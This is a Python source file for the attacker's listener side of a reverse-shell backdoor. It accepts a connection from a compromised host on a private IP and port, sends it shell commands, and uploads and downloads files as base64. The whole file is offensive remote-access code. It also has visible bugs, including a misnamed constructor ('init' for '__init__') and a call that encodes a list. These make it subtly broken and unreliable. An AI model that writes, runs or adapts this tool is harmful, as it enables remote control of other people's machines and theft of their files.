import socket
import json
import base64

class Listener:
    def init(self, ip, port):
        lis = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        lis.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        lis.bind((ip, port))
        lis.listen(0)
        print(f"[+] Waiting for incoming connection.")
        self.conn, addr = lis.accept()
        print(f"[+] Got a connection {str(addr)}")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.conn.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.conn.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command.encode())

        if command[0] == 'exit':
            self.conn.close()
            exit()
        
        return self.reliable_receive()

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())
    
    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return "[+] Download successfully."

    def run(self):
        while True:
            command = input("[Enter a command] $ ")
            command = command.split(" ")

            try:
                if command[0] == 'upload':
                    file_content = self.read_file(command[1])
                    command.append(file_content.decode())

                result = self.execute_remotely(command)

                if command[0] == 'download' and "[-] Error " not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution."
            print(result)


my_listener = Listener("192.168.64.2", 8080)
my_listener.run()
